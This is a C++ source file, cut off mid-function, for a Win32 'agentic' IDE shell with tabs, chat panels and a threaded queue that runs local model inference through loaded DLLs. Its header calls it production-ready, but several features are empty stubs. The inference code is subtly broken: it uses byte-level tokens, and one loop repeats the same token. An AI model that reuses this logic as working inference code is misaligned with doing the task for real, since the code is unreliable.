/*
 * RawrXD_Win32_IDE.cpp - Pure Win32 IDE Shell (Zero Qt Dependencies)
 * Production-ready autonomous agentic IDE
 * 
 * Build: cl /O2 /DNDEBUG RawrXD_Win32_IDE.cpp /link user32.lib gdi32.lib shell32.lib comctl32.lib comdlg32.lib ole32.lib
 */

#define WIN32_LEAN_AND_MEAN
#define UNICODE
#define _UNICODE
#define NOMINMAX
#include <windows.h>
#include <commctrl.h>
#include <shellapi.h>
#include <richedit.h>
#include <commdlg.h>
#include <shlobj.h>
#include <wininet.h>
#include <shlwapi.h>
#include <string>
#include <vector>
#include <map>
#include <fstream>
#include <sstream>
#include <mutex>
#include <queue>
#include <algorithm>

#include <process.h>

// Missing button macros
#ifndef Button_SetCheck
#define Button_SetCheck(hwnd, check) SendMessage((hwnd), BM_SETCHECK, (WPARAM)(check), 0)
#endif
#ifndef Button_GetCheck
#define Button_GetCheck(hwnd) (int)SendMessage((hwnd), BM_GETCHECK, 0, 0)
#endif

// Include our custom components
#include "src/agentic/monaco/MonacoIntegration.hpp"
#include "src/agentic/terminal/TerminalEmulator.hpp"

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "comdlg32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")

struct AICompletion;

// ============================================================================
// Forward declarations for Titan Kernel DLL
// ============================================================================
typedef int  (*Titan_Initialize_t)();
typedef int  (*Titan_LoadModelPersistent_t)(const char* path, const char* name);
typedef int  (*Titan_RunInference_t)(int slotIdx, const char* prompt, int maxTokens);
typedef void (*Titan_Shutdown_t)();

static HMODULE g_hTitanDll = nullptr;
static Titan_Initialize_t       pTitan_Initialize = nullptr;
static Titan_LoadModelPersistent_t pTitan_LoadModel = nullptr;
static Titan_RunInference_t     pTitan_RunInference = nullptr;
static Titan_Shutdown_t         pTitan_Shutdown = nullptr;

// ============================================================================
// Forward declarations for Inference Engine DLL (GGUF)
// ============================================================================
typedef void* ModelContext;
typedef void* (*LoadModel_t)(const wchar_t* path);
typedef void  (*UnloadModel_t)(void* ctx);
typedef int   (*ForwardPassInfer_t)(void* ctx, int* tokens, int n_tokens, float* logits);
typedef int   (*SampleNext_t)(float* logits, int vocab_size, float temperature, float top_p, int top_k);

static HMODULE g_hInferenceEngine = nullptr;
static LoadModel_t       pLoadModel = nullptr;
static UnloadModel_t     pUnloadModel = nullptr;
static ForwardPassInfer_t pForwardPassInfer = nullptr;
static SampleNext_t      pSampleNext = nullptr;
static void*             g_modelContext = nullptr;
static bool              g_modelLoaded = false;
static std::wstring      g_loadedModelPath;

// ============================================================================
// Forward declarations for Native Model Bridge DLL (ASM)
// ============================================================================
typedef int  (*LoadModelNative_t)(const char* filepath);
typedef int  (*GetTokenEmbedding_t)(int tokenId, float* output, int dim);
typedef int  (*ForwardPassASM_t)(int* tokens, int numTokens, float* output, int vocabSize);
typedef void (*CleanupMathTables_t)();

static HMODULE g_hModelBridgeDll = nullptr;
static LoadModelNative_t      pLoadModelNative = nullptr;
static GetTokenEmbedding_t    pGetTokenEmbedding = nullptr;
static ForwardPassASM_t       pForwardPassASM = nullptr;
static CleanupMathTables_t    pCleanupMathTables = nullptr;

// ============================================================================
// Globals
// ============================================================================
static HWND g_hwndMain = nullptr;
static HWND g_hwndEditor = nullptr;
static HWND g_hwndOutput = nullptr;
static HWND g_hwndFileTree = nullptr;
static HWND g_hwndToolbar = nullptr;
static HWND g_hwndStatusBar = nullptr;
static HWND g_hwndSplitter = nullptr;
static HWND g_hwndTabControl = nullptr;
static HWND g_hwndChatInput = nullptr;
static HWND g_hwndChatHistory = nullptr;
static HWND g_hwndTerminal = nullptr;
static std::unique_ptr<RawrXD::Agentic::TerminalEmulator> g_terminalEmulator;

// Code Issues Panel
static HWND g_hwndIssuesPanel = nullptr;
static HWND g_hwndIssuesList = nullptr;
static HWND g_hwndIssuesFilter = nullptr;
static HWND g_hwndIssuesCritical = nullptr;
static HWND g_hwndIssuesHigh = nullptr;
static HWND g_hwndIssuesMedium = nullptr;
static HWND g_hwndIssuesLow = nullptr;
static HWND g_hwndIssuesInfo = nullptr;

// Extended Chat Controls
static HWND g_hwndChatNew = nullptr;
static HWND g_hwndChatHistoryBtn = nullptr;
static HWND g_hwndChatExport = nullptr;
static HWND g_hwndChatConfig = nullptr;
static HWND g_hwndChatMCP = nullptr;
static HWND g_hwndChatLogs = nullptr;

static HFONT g_hFontCode = nullptr;
static HFONT g_hFontUI = nullptr;

static std::wstring g_currentFile;
static bool g_isDirty = false;

// Chat server process handle
static HANDLE g_hChatServerProcess = nullptr;
static std::wstring g_workspaceRoot;

// Chat system globals
static bool g_chatServerRunning = false;

// UI globals
static HINSTANCE g_hInstance = nullptr;
static HFONT g_hFont = nullptr;

// Chat panel globals
static HWND g_hwndChatPanel = nullptr;
static HWND g_hwndChatSend = nullptr;

// ============================================================================
// Inference Request Structure
// ============================================================================
struct InferenceRequest {
    std::wstring prompt;
    int maxTokens;
    float temperature;
    float topP;
    std::wstring model;
    bool streamOutput;
    HWND callbackWindow;
    UINT callbackMessage;
};

// ============================================================================
// Inference Pipeline Globals
// ============================================================================
static std::queue<InferenceRequest> g_inferenceQueue;
static std::mutex g_inferenceQueueMutex;
static HANDLE g_inferenceThread = nullptr;
static bool g_inferenceRunning = false;
static bool g_bAbortInference = false;

// ============================================================================
// Forward Declarations - Structures
// ============================================================================

struct CodeIssue {
    std::wstring file;
    int line;
    int column;
    std::wstring severity;  // "Critical", "High", "Medium", "Low", "Info"
    std::wstring category;  // "Error", "Warning", "Info", "Security", "Performance"
    std::wstring message;
    std::wstring description;
    std::wstring rule;
    std::wstring quickFix;
    bool isFixable;
    SYSTEMTIME timestamp;
};

// ============================================================================
// Issues system globals
// ============================================================================
static std::vector<CodeIssue> g_codeIssues;
static std::mutex g_issuesMutex;

struct AICompletion;
struct EditorTab;
struct ChatSession;

// ============================================================================
// Menu and Control ID Constants
// ============================================================================
#define ID_FILE_NEW         1001
#define ID_FILE_OPEN        1002
#define ID_FILE_SAVE        1003
#define ID_FILE_SAVEAS      1004
#define ID_FILE_CLOSE       1005
#define ID_FILE_EXIT        1006
#define ID_FILE_OPENFOLDER 1007
#define ID_EDIT_UNDO        1010
#define ID_EDIT_REDO        1011
#define ID_EDIT_CUT         1012
#define ID_EDIT_COPY        1013
#define ID_EDIT_PASTE       1014
#define ID_EDIT_FIND        1015
#define ID_EDIT_REPLACE     1016
#define ID_EDIT_SELECT_ALL  1017
#define ID_EDIT_MULTICURSOR 1018
#define ID_EDIT_COLUMN_MODE 1019
#define ID_VIEW_FILETREE    1020
#define ID_VIEW_OUTPUT      1021
#define ID_VIEW_TERMINAL    1022
#define ID_VIEW_CHAT        1023
#define ID_VIEW_ISSUES      1024
#define ID_VIEW_MINIMAP     1025
#define ID_VIEW_FOLDING     1026
#define ID_BUILD_BUILD      1040
#define ID_BUILD_RUN        1041
#define ID_BUILD_DEBUG      1042
#define ID_BUILD_COMPILE    1043
#define ID_BUILD_DLLS       1044
#define ID_BUILD_CAR_ENCRYPT 1045
#define ID_BUILD_CAR_DEPLOY  1046
#define ID_AI_COMPLETE      1030
#define ID_AI_EXPLAIN       1031
#define ID_AI_REFACTOR      1032
#define ID_AI_LOADMODEL     1033
#define ID_AI_COMPLETION    1034
#define ID_AI_FIX           1035
#define ID_AI_LOAD_GGUF     1036
#define ID_AI_UNLOADMODEL   1037
#define ID_CHAT_START_SERVER 1060
#define ID_CHAT_STOP_SERVER  1061
#define ID_CHAT_SEND         1062
#define ID_HELP_ABOUT       1100

// IDM_ aliases for compatibility
#define IDM_FILE_NEW        ID_FILE_NEW
#define IDM_FILE_OPEN       ID_FILE_OPEN
#define IDM_FILE_SAVE       ID_FILE_SAVE
#define IDM_FILE_SAVEAS     ID_FILE_SAVEAS
#define IDM_FILE_CLOSE      ID_FILE_CLOSE
#define IDM_FILE_OPENFOLDER ID_FILE_OPENFOLDER
#define IDM_FILE_EXIT       ID_FILE_EXIT
#define IDM_EDIT_UNDO       ID_EDIT_UNDO
#define IDM_EDIT_REDO       ID_EDIT_REDO
#define IDM_EDIT_CUT        ID_EDIT_CUT
#define IDM_EDIT_COPY       ID_EDIT_COPY
#define IDM_EDIT_PASTE      ID_EDIT_PASTE
#define IDM_VIEW_FILETREE   ID_VIEW_FILETREE
#define IDM_VIEW_OUTPUT     ID_VIEW_OUTPUT
#define IDM_VIEW_TERMINAL   ID_VIEW_TERMINAL
#define IDM_VIEW_CHAT       ID_VIEW_CHAT
#define IDM_VIEW_ISSUES     ID_VIEW_ISSUES
#define IDM_BUILD_BUILD     ID_BUILD_BUILD
#define IDM_BUILD_RUN       ID_BUILD_RUN
#define IDM_BUILD_DEBUG     ID_BUILD_DEBUG
#define IDM_BUILD_COMPILE   ID_BUILD_COMPILE
#define IDM_BUILD_DLLS      ID_BUILD_DLLS
#define IDM_BUILD_CAR_ENCRYPT ID_BUILD_CAR_ENCRYPT
#define IDM_BUILD_CAR_DEPLOY  ID_BUILD_CAR_DEPLOY
#define IDM_EDIT_FIND       ID_EDIT_FIND
#define IDM_AI_GENERATE     ID_AI_COMPLETE
#define IDM_AI_EXPLAIN      ID_AI_EXPLAIN
#define IDM_AI_REFACTOR     ID_AI_REFACTOR
#define IDM_AI_FIX          ID_AI_FIX
#define IDM_AI_LOADMODEL    ID_AI_LOADMODEL
#define IDM_AI_LOADGGUF     ID_AI_LOAD_GGUF
#define IDM_AI_UNLOADMODEL  ID_AI_UNLOADMODEL
#define IDM_HELP_ABOUT      ID_HELP_ABOUT

// Test Harness
#define RAWRXD_PIPE_NAME L"\\\\.\\pipe\\RawrXD_TestBeacon"
#define WM_TEST_BEACON   (WM_APP + 100)
#define WM_TEST_RESULT   (WM_APP + 101)

// Control IDs
#define IDC_EDITOR          2001
#define IDC_OUTPUT          2002
#define IDC_FILETREE        2003
#define IDC_STATUSBAR       2004
#define IDC_ISSUES_PANEL    2005
#define IDC_ISSUES_LIST     2006
#define IDC_ISSUES_CRITICAL 2007
#define IDC_ISSUES_HIGH     2008
#define IDC_ISSUES_MEDIUM   2009
#define IDC_ISSUES_LOW      2010
#define IDC_ISSUES_INFO     2011
#define IDC_ISSUES_REFRESH  2012
#define IDC_ISSUES_EXPORT   2013
#define IDC_ISSUES_CLEAR    2014
#define IDC_MINIMAP         2015

// ============================================================================
// Forward declarations for functions
// ============================================================================
void CreateChatPanel();
void CreateTerminal();
void ExecuteTerminalCommand(const std::wstring& command);
void CreateIssuesPanel();
void CreateMenuBar(HWND hwnd);
void AI_FixCode();
void SendChatMessage();
void RefreshCodeIssues();
void AddCodeIssue(const CodeIssue& issue);
void ClearCodeIssues();
void RunCodeAnalysis();
void FilterIssuesBySeverity(const std::wstring& severity);
void ApplySyntaxHighlighting(HWND hwnd);
void ToggleMinimap();
std::wstring OpenFileDialog(HWND hwnd);
std::wstring SaveFileDialog(HWND hwnd);
bool LoadFile(const std::wstring& path);
void PopulateFileTree(const std::wstring& rootPath, HTREEITEM hParent = TVI_ROOT);
std::wstring BrowseFolderDialog(HWND hwnd);
std::wstring GetTreeItemPath(HTREEITEM hItem);
bool SaveFile(const std::wstring& path);
void SaveCurrentFile();
void AI_LoadModel();
void AI_LoadGGUF();
void AI_UnloadModel();
void StartTestHarness();
void StopTestHarness();
static void HandleTestBeacon(HWND hwnd, WPARAM wParam, LPARAM lParam);

// Find/Replace state
static FINDREPLACE g_fr = {};
static wchar_t g_szFindWhat[256] = {};
static wchar_t g_szReplaceWith[256] = {};
static HWND g_hwndFindDlg = nullptr;
static UINT g_uFindReplaceMsg = 0;

// Terminal globals
static HANDLE g_hCmdProcess = nullptr;
static HANDLE g_hCmdStdoutRead = nullptr;
static HANDLE g_hCmdStdinWrite = nullptr;
static CRITICAL_SECTION g_terminalCS;
static bool g_terminalCSInitialized = false;

// UI visibility flags
static bool g_bFileTreeVisible = true;
static bool g_bOutputVisible = true;
static bool g_bTerminalVisible = false;
static bool g_bChatVisible = false;
static bool g_bIssuesVisible = false;

// ============================================================================
// Forward Declarations - All Functions
// ============================================================================

// Utility functions
std::string WideToUtf8(const std::wstring& wide);
std::wstring Utf8ToWide(const std::string& utf8);
void AppendWindowText(HWND hwnd, const wchar_t* text);

// Tab management
void CreateNewTab(const std::wstring& filePath = L"");
void OpenFile(const std::wstring& filepath);
bool SaveFile();
bool SaveFileAs();
void SaveCurrentFile();
void CloseTab(int tabIndex);
void SwitchToTab(int index);

// File operations
void HandleFileMenu(HWND hwnd, UINT id);
void HandleEditMenu(HWND hwnd, UINT id);
void HandleViewMenu(HWND hwnd, UINT id);
void HandleAIMenu(HWND hwnd, UINT id);
void HandleBuildMenu(HWND hwnd, UINT id);

// AI features
void TriggerAICompletion();
void ExplainSelectedCode();
void RefactorSelectedCode();
void ShowAICompletion(const AICompletion& completion);
void HideAICompletion();
void AcceptAICompletion();

// Model loading
void LoadGGUFModel();
void AI_LoadModel();
bool LoadInferenceEngine();
bool LoadModelWithInferenceEngine(const std::wstring& modelPath);
bool LoadTitanKernel();
bool LoadModelBridge();
void UnloadInferenceModel();

// Chat system
void HandleChatSend();
void SendChatToServer(const std::wstring& message);
bool StartChatServer();
void StopChatServer();
void CreateNewChatSession();
void LoadChatHistory();
void SaveChatSession();
void ExportChatHistory();
void ConfigureMCPServers();
void ShowChatLogs();
void SwitchChatSession(int sessionIndex);

// HTTP client
void CleanupHTTPClient();
void InitializeHTTPClient();

// Inference pipeline forward declarations
void QueueInferenceRequest(const std::wstring& prompt, int maxTokens, float temperature, HWND callbackWindow, UINT callbackMessage);
void StartInferenceThread();
void StopInferenceThread();

// Find/Replace dialogs
void ShowFindDialog();
void ShowReplaceDialog();
void HandleFindReplace(LPFINDREPLACE pfr);

// Layout management
void ToggleAllFolding();
void InitializeCodeFolding();

// Multi-cursor and column selection
void EnableMultiCursorMode();
void DisableMultiCursorMode();
void EnableColumnSelectionMode();
void DisableColumnSelectionMode();

// Build and run
void CompileCurrentFile();
void RunCurrentFile();
void DebugCurrentFile();

// HTTP client
void CleanupHTTPClient();
void InitializeHTTPClient();

// Phase 1: Critical fixes forward declarations
void ApplyCriticalFixes();
void CheckMissingDLLs();
void CompileMissingDLLs();

// Carmilla .car encryption & runtime deployment
void CarmillaEncryptFile();
void CarmillaDeployCar();
bool CarmillaDecryptAndExecute(const std::wstring& carPath);

// Subclass procedures
LRESULT CALLBACK ChatInputSubclassProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam, UINT_PTR uIdSubclass, DWORD_PTR dwRefData);
LRESULT CALLBACK EditorSubclassProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam, UINT_PTR uIdSubclass, DWORD_PTR dwRefData);
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);

// Issues panel
void RefreshCodeIssues();
void AddCodeIssue(const CodeIssue& issue);
void ClearCodeIssues();
void ExportIssues();
void FilterIssuesBySeverity();
void JumpToIssue(int issueIndex);
void ApplyQuickFix(int issueIndex);
void RunCodeAnalysis();
void ShowIssuesContextMenu(POINT pt);

// Settings system
std::wstring GetSettingsFilePath();
void LoadSettings();
void SaveSettings();
void ApplySettings();
void ShowSettingsDialog();
void ResetToDefaults();
void ImportSettings(const std::wstring& filePath);
void ExportSettings(const std::wstring& filePath);

// Multi-tab editor support
struct EditorTab {
    HWND hwndEdit;
    std::wstring filePath;
    bool isDirty;
};
static std::vector<EditorTab> g_tabs;
static int g_activeTab = -1;

// ============================================================================
// Chat Session Management
// ============================================================================
struct ChatSession {
    std::wstring id;
    std::wstring title;
    std::vector<std::wstring> messages;
    SYSTEMTIME created;
    SYSTEMTIME lastUsed;
};

static std::vector<ChatSession> g_chatSessions;
static int g_currentChatSession = -1;
static std::wstring g_mcpServerConfig;
static bool g_chatPersistentMode = true;

static bool g_completionVisible = false;
static std::wstring g_completionText;
static int g_completionAnchor = -1;
static COLORREF g_colorCompletionGhost = RGB(100, 100, 100);

// ============================================================================
// Multi-cursor Support
// ============================================================================
struct CursorPosition {
    int line;
    int column;
    int charIndex;
    bool isSelection;
    int selectionStart;
    int selectionEnd;
};

static std::vector<CursorPosition> g_multiCursors;
static bool g_multiCursorMode = false;
static COLORREF g_colorMultiCursor = RGB(255, 255, 100);

// ============================================================================
// Code Folding Support
// ============================================================================
struct FoldingRegion {
    int startLine;
    int endLine;
    bool isCollapsed;
    std::wstring preview;
};

static std::vector<FoldingRegion> g_foldingRegions;
static bool g_codeFoldingEnabled = true;

// ============================================================================
// Minimap Support
// ============================================================================
static HWND g_hwndMinimap = nullptr;
static bool g_minimapVisible = true;
static int g_minimapWidth = 120;
static HBITMAP g_minimapBitmap = nullptr;

// ============================================================================
// Column Selection Mode
// ============================================================================
static bool g_columnSelectionMode = false;
static int g_columnSelectionStartLine = -1;
static int g_columnSelectionStartCol = -1;
static int g_columnSelectionEndLine = -1;
static int g_columnSelectionEndCol = -1;

// ============================================================================
// Editor Settings System
// ============================================================================
struct EditorSettings {
    std::wstring fontFamily = L"Consolas";
    int fontSize = 11;
    bool wordWrap = false;
    bool showLineNumbers = true;
    bool showWhitespace = false;
    int tabSize = 4;
    bool useTabs = false;
    
    std::wstring theme = L"dark";
    COLORREF backgroundColor = RGB(30, 30, 30);
    COLORREF textColor = RGB(204, 204, 204);
    COLORREF selectionColor = RGB(51, 153, 255);
    COLORREF lineNumberColor = RGB(128, 128, 128);
    
    bool minimapEnabled = true;
    bool codeFoldingEnabled = true;
    bool multiCursorEnabled = true;
    bool columnSelectionEnabled = true;
    
    std::wstring defaultModel = L"";
    float temperature = 0.7f;
    int maxTokens = 150;
    bool autoComplete = true;
    bool inlineChat = true;
    
    COLORREF terminalBgColor = RGB(20, 20, 20);
    COLORREF terminalTextColor = RGB(200, 255, 100);
    std::wstring terminalShell = L"PowerShell.exe";
    
    bool fileTreeVisible = true;
    bool outputVisible = true;
    bool terminalVisible = true;
    bool chatVisible = true;
    bool issuesVisible = true;
    
    int fileTreeWidth = 200;
    int bottomPanelHeight = 200;
    int minimapWidth = 120;
};

static EditorSettings g_settings;
static std::wstring g_settingsFilePath;

// ============================================================================
// Theme Management
// ============================================================================
struct Theme {
    std::wstring name;
    COLORREF background;
    COLORREF text;
    COLORREF selection;
    COLORREF lineNumber;
    COLORREF keyword;
    COLORREF comment;
    COLORREF string;
    COLORREF number;
    COLORREF terminalBg;
    COLORREF terminalText;
    COLORREF terminalSuccess;
    COLORREF terminalError;
    COLORREF terminalWarning;
};

static std::vector<Theme> g_themes = {
    {
        L"Dark (Default)",
        RGB(30, 30, 30), RGB(204, 204, 204), RGB(51, 153, 255), RGB(128, 128, 128),
        RGB(86, 156, 214), RGB(106, 153, 85), RGB(206, 145, 120), RGB(181, 206, 168),
        RGB(20, 20, 20), RGB(200, 255, 100), RGB(100, 255, 100), RGB(255, 100, 100), RGB(255, 255, 100)
    },
    {
        L"Light",
        RGB(255, 255, 255), RGB(0, 0, 0), RGB(173, 214, 255), RGB(128, 128, 128),
        RGB(0, 0, 255), RGB(0, 128, 0), RGB(163, 21, 21), RGB(9, 134, 88),
        RGB(240, 240, 240), RGB(0, 0, 0), RGB(0, 128, 0), RGB(255, 0, 0), RGB(255, 165, 0)
    },
    {
        L"Monokai",
        RGB(39, 40, 34), RGB(248, 248, 242), RGB(73, 72, 62), RGB(128, 128, 128),
        RGB(249, 38, 114), RGB(117, 113, 94), RGB(230, 219, 116), RGB(174, 129, 255),
        RGB(39, 40, 34), RGB(248, 248, 242), RGB(166, 226, 46), RGB(249, 38, 114), RGB(253, 151, 31)
    }
};

static int g_currentTheme = 0;

// Panel visibility states - ALL ENABLED BY DEFAULT
// (Moved to top to avoid conflicts)

// Issues panel state
static bool g_bShowCritical = true;
static bool g_bShowHigh = true;
static bool g_bShowMedium = true;
static bool g_bShowLow = true;
static bool g_bShowInfo = true;

// Syntax highlighting colors
static COLORREF g_colorKeyword = RGB(86, 156, 214);    // Blue
static COLORREF g_colorString = RGB(214, 157, 133);    // Orange
static COLORREF g_colorComment = RGB(106, 153, 85);    // Green
static COLORREF g_colorNumber = RGB(181, 206, 168);    // Light green
static COLORREF g_colorPreproc = RGB(155, 155, 155);   // Gray
static COLORREF g_colorDefault = RGB(212, 212, 212);   // White
static COLORREF g_colorBackground = RGB(30, 30, 30);   // Dark

// ============================================================================
// AI Completion Structure
// ============================================================================
struct AICompletion {
    std::wstring text;
    std::wstring detail;
    float confidence;
    std::wstring kind;
    int cursorOffset;
    bool isMultiLine;
};

// ============================================================================
// Inference Pipeline Implementation
// ============================================================================
void QueueInferenceRequest(const std::wstring& prompt, int maxTokens = 150, 
                          float temperature = 0.7f, HWND callbackWindow = nullptr, 
                          UINT callbackMessage = WM_USER + 1) {
    InferenceRequest request;
    request.prompt = prompt;
    request.maxTokens = maxTokens;
    request.temperature = temperature;
    request.topP = 0.9f;
    request.model = L"default";
    request.streamOutput = true;
    request.callbackWindow = callbackWindow;
    request.callbackMessage = callbackMessage;
    
    {
        std::lock_guard<std::mutex> lock(g_inferenceQueueMutex);
        g_inferenceQueue.push(request);
    }
    
    AppendWindowText(g_hwndOutput, 
        (L"[AI] Queued inference request: " + prompt.substr(0, 50) + L"...\r\n").c_str());
}

// ============================================================================
// Tab Management Functions
// ============================================================================
void CreateNewTab(const std::wstring& filePath) {
    EditorTab tab;
    tab.filePath = filePath;
    tab.isDirty = false;
    
    // Create editor window for this tab
    tab.hwndEdit = CreateWindowEx(
        WS_EX_CLIENTEDGE,
        RICHEDIT_CLASS,
        L"",
        WS_CHILD | WS_VISIBLE | WS_VSCROLL | WS_HSCROLL | ES_MULTILINE | ES_WANTRETURN,
        0, 0, 0, 0,
        g_hwndMain,
        nullptr,
        GetModuleHandle(nullptr),
        nullptr
    );
    
    if (tab.hwndEdit) {
        SendMessage(tab.hwndEdit, EM_SETTEXTMODE, TM_PLAINTEXT, 0);
        SendMessage(tab.hwndEdit, WM_SETFONT, (WPARAM)g_hFontCode, TRUE);
        
        // Set up subclassing for AI completions
        SetWindowSubclass(tab.hwndEdit, EditorSubclassProc, 0, 0);
    }
    
    g_tabs.push_back(tab);
    
    // Add tab to tab control
    if (g_hwndTabControl) {
        TCITEM tci = {0};
        tci.mask = TCIF_TEXT;
        
        std::wstring tabName = filePath.empty() ? L"Untitled" : filePath.substr(filePath.find_last_of(L"\\") + 1);
        tci.pszText = (LPWSTR)tabName.c_str();
        
        int tabIndex = TabCtrl_InsertItem(g_hwndTabControl, g_tabs.size() - 1, &tci);
        TabCtrl_SetCurSel(g_hwndTabControl, tabIndex);
    }
    
    // Switch to new tab
    SwitchToTab((int)g_tabs.size() - 1);
}

void CloseTab(int tabIndex) {
    if (tabIndex < 0 || tabIndex >= (int)g_tabs.size()) return;
    
    // Don't close if it's the last tab
    if (g_tabs.size() <= 1) return;
    
    // Destroy the editor window
    if (g_tabs[tabIndex].hwndEdit) {
        DestroyWindow(g_tabs[tabIndex].hwndEdit);
    }
    
    // Remove from tab control
    if (g_hwndTabControl) {
        TabCtrl_DeleteItem(g_hwndTabControl, tabIndex);
    }
    
    // Remove from vector
    g_tabs.erase(g_tabs.begin() + tabIndex);
    
    // Update active tab
    if (g_activeTab >= tabIndex && g_activeTab > 0) {
        g_activeTab--;
    }
    
    // Switch to appropriate tab
    if (!g_tabs.empty()) {
        int newTab = std::min(g_activeTab, (int)g_tabs.size() - 1);
        SwitchToTab(newTab);
    }
}

void SwitchToTab(int tabIndex) {
    if (tabIndex < 0 || tabIndex >= (int)g_tabs.size()) return;
    
    // Hide current editor
    if (g_activeTab >= 0 && g_activeTab < (int)g_tabs.size()) {
        ShowWindow(g_tabs[g_activeTab].hwndEdit, SW_HIDE);
    }
    
    // Show new editor
    ShowWindow(g_tabs[tabIndex].hwndEdit, SW_SHOW);
    
    // Update active tab
    g_activeTab = tabIndex;
    
    // Update tab control selection
    if (g_hwndTabControl) {
        TabCtrl_SetCurSel(g_hwndTabControl, tabIndex);
    }
    
    // Update window title
    std::wstring title = L"RawrXD IDE - ";
    if (!g_tabs[tabIndex].filePath.empty()) {
        title += g_tabs[tabIndex].filePath.substr(g_tabs[tabIndex].filePath.find_last_of(L"\\") + 1);
        if (g_tabs[tabIndex].isDirty) title += L"*";
    } else {
        title += L"Untitled";
        if (g_tabs[tabIndex].isDirty) title += L"*";
    }
    SetWindowText(g_hwndMain, title.c_str());
}

void DebugCurrentFile() {
    if (g_activeTab < 0 || g_activeTab >= (int)g_tabs.size()) return;
    
    std::wstring filePath = g_tabs[g_activeTab].filePath;
    if (filePath.empty()) {
        MessageBox(g_hwndMain, L"Please save the file first before debugging.", L"Debug", MB_OK | MB_ICONINFORMATION);
        return;
    }
    
    // For now, just show a message - real debugging would require more complex setup
    std::wstring msg = L"Debugging " + filePath + L" (not implemented yet)";
    MessageBox(g_hwndMain, msg.c_str(), L"Debug", MB_OK | MB_ICONINFORMATION);
}

// ============================================================================
// Inference Worker Thread - processes queued requests asynchronously
// ============================================================================
static DWORD WINAPI InferenceWorkerThread(LPVOID /*param*/) {
    AppendWindowText(g_hwndOutput, L"[AI] Inference worker thread started.\r\n");
    
    while (g_inferenceRunning) {
        InferenceRequest request;
        bool hasRequest = false;
        
        {
            std::lock_guard<std::mutex> lock(g_inferenceQueueMutex);
            if (!g_inferenceQueue.empty()) {
                request = g_inferenceQueue.front();
                g_inferenceQueue.pop();
                hasRequest = true;
            }
        }
        
        if (!hasRequest) {
            Sleep(50); // Don't spin-wait
            continue;
        }
        
        g_bAbortInference = false;
        std::string prompt = WideToUtf8(request.prompt);
        std::string result;
        result.reserve(2048);
        
        // ── Try Titan Kernel ──
        if (g_hTitanDll && pTitan_RunInference && g_modelLoaded) {
            int res = pTitan_RunInference(0, prompt.c_str(), request.maxTokens);
            if (res >= 0) {
                // Titan handles the generation internally
                AppendWindowText(g_hwndOutput, L"[AI] Titan inference completed.\r\n");
                continue;
            }
        }
        
        // ── Try InferenceEngine ──
        if (g_modelLoaded && pForwardPassInfer && pSampleNext && g_modelContext) {
            std::vector<int> tokens;
            tokens.reserve(prompt.size());
            for (unsigned char c : prompt) tokens.push_back(c);
            
            std::vector<float> logits(32000, 0.0f);
            if (pForwardPassInfer(g_modelContext, tokens.data(), (int)tokens.size(), logits.data()) == 0) {
                for (int i = 0; i < request.maxTokens && !g_bAbortInference; i++) {
                    int next = pSampleNext(logits.data(), 32000, request.temperature, request.topP, 40);
                    if (next <= 0) break;
                    result += (char)next;
                    tokens.push_back(next);
                    if (pForwardPassInfer(g_modelContext, tokens.data(), (int)tokens.size(), logits.data()) != 0) break;
                }
            }
        }
        
        // ── Try NativeModelBridge ──
        if (result.empty() && g_hModelBridgeDll && pForwardPassASM && g_modelLoaded) {
            std::vector<int> tokens;
            for (unsigned char c : prompt) tokens.push_back(c);
            std::vector<float> output(32000, 0.0f);
            if (pForwardPassASM(tokens.data(), (int)tokens.size(), output.data(), 32000) == 0) {
                for (int i = 0; i < request.maxTokens && !g_bAbortInference; i++) {
                    int best = 0;
                    float bestScore = output[0];
                    for (int j = 1; j < 32000; j++) {
                        if (output[j] > bestScore) { bestScore = output[j]; best = j; }
                    }
                    if (best <= 0 || bestScore < 0.01f) break;
                    result += (char)best;
                }
            }
        }
        
        if (!result.empty()) {
            std::wstring wResult = Utf8ToWide(result);
            // Post result back to UI thread if callback window provided
            if (request.callbackWindow && request.callbackMessage) {
                wchar_t* heapResult = new wchar_t[wResult.size() + 1];
                wcscpy_s(heapResult, wResult.size() + 1, wResult.c_str());
                PostMessage(request.callbackWindow, request.callbackMessage, 0, (LPARAM)heapResult);
            } else {
                // Default: output to chat panel
                if (g_hwndChatHistory) {
                    AppendWindowText(g_hwndChatHistory, L"\r\nAI: ");
                    AppendWindowText(g_hwndChatHistory, wResult.c_str());
                    AppendWindowText(g_hwndChatHistory, L"\r\n");
                }
            }
        }
        
        if (g_bAbortInference) {
            AppendWindowText(g_hwndOutput, L"[AI] Inference aborted by user.\r\n");
            g_bAbortInference = false;
        }
    }
    
    AppendWindowText(g_hwndOutput, L"[AI] Inference worker thread stopped.\r\n");
    return 0;
}

void StartInferenceThread() {
    if (g_inferenceThread) return;
    g_inferenceRunning = true;
    g_inferenceThread = CreateThread(nullptr, 0, InferenceWorkerThread, nullptr, 0, nullptr);
    if (g_inferenceThread) {
        AppendWindowText(g_hwndOutput, L"[AI] Inference thread initialized.\r\n");
    }
}

void StopInferenceThread() {
    if (!g_inferenceThread) return;
    g_inferenceRunning = false;
    g_bAbortInference = true;
    WaitForSingleObject(g_inferenceThread, 5000);
    CloseHandle(g_inferenceThread);
    g_inferenceThread = nullptr;
}

// ============================================================================
// AI Completion Functions
// ============================================================================
void ShowAICompletion(const AICompletion& completion) {
    // Implementation for showing AI completion popup
    AppendWindowText(g_hwndOutput, (L"[AI] Completion: " + completion.text + L"\r\n").c_str());
}

void HideAICompletion() {
    // Hide completion popup
}

void AcceptAICompletion() {
    // Accept the current completion
}

// ============================================================================
// Trigger AI Completion
// ============================================================================
void TriggerAICompletion() {
    if (!g_hwndEditor) {
        AppendWindowText(g_hwndOutput, L"[AI] No editor active for completion.\r\n");
        return;
    }

    // Get cursor position and surrounding context window
    DWORD selStart = 0, selEnd = 0;
    SendMessage(g_hwndEditor, EM_GETSEL, (WPARAM)&selStart, (LPARAM)&selEnd);
    
    // Extract broad context: 512 chars before cursor + 128 after for prompt construction
    int textLen = GetWindowTextLength(g_hwndEditor);
    if (textLen == 0) return;
    
    std::wstring fullContent(textLen + 1, L'\0');
